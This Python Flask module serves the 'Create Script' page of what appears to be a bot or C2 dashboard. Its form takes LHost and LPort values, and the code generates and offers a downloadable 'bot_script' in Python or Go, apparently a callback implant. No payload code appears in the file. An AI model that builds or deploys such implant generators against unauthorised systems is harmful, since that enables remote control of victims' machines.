#!/usr/bin/env python3

'''
this script is for /create_script page
'''

from flask import render_template,redirect,request,send_from_directory,Response
from main.web.functions.web_modules import check_login ,replace_user ,replace_dashboard_title
from modules.create_script import ScriptCreator

class CreateScriptWeb:

    def run(self):
        if not (check_login()):  # check if user is logged in ,returns true if is logged in
            return redirect('/login' ,code=302)

        page = self.read_page()
        page = replace_user(page=page)
        page = page.replace('{to_replace_text}', self.add_element())
        page = replace_dashboard_title(page=page, name='Create Script')
        return page

    def read_page(self):
        template = render_template('dashboard.html')
        return template

    def add_element(self):
        html_text = '''
        <form class="form-inline" method="POST" action="/create_script_conf" id="create_script_conf_form">
      <div class="form-group mb-2">
        <label class="sr-only">LHost</label>
        <input type="text" class="form-control" id="localhost_create_script" placeholder="LHost" required>
      </div>
      <div class="form-group mb-2">
        <label class="sr-only">LPort</label>
        <input type="text" class="form-control" id="localport_create_script" placeholder="LPort" required>
      </div>
      
    <select class="form-control create_script_lang">
        <option value="python">Python</option>
        <option value="go">Go</option>
    </select>
      <button class="btn btn-success mb-2 my-3 event_create_script">Create Script</button>
    </form>

    <div class="server_create_script_response my-5"></div>
            '''
        return html_text

def download_script_url_func(flask_app):

    if (not check_login()):
        return redirect('/login', code=302)

    allowed_langs = ['py', 'go']
    if request.args.get('script_lang'):
        script_lang = request.args.get('script_lang')
        if script_lang in allowed_langs:
            script_name = 'bot_script.{}'.format(script_lang)
            return send_from_directory(directory=flask_app.root_path, path=script_name)

        else:
            return 'Language Not Found'
    else:
        return 'Language Not Found'

def create_script_create_url_func():

    if not (check_login()):  # check if user is logged in ,returns true if is logged in
        return redirect('/login', code=302)

    script_creator = ScriptCreator(lhost=request.form['localhost'], lport=request.form['localport'],
                                   lang=request.form['lang_create_script'], is_from_gui=False)
    script_creator.create()

    return 'CreateScript Request Sent'

def create_script_conf_func(streamer_function):
    # streamer function is for get lines from create_script.py

    if not (check_login()):  # check if user is logged in ,returns true if is logged in
        return redirect('/login', code=302)

    return Response(streamer_function(), mimetype="text/plain", content_type="text/event-stream")
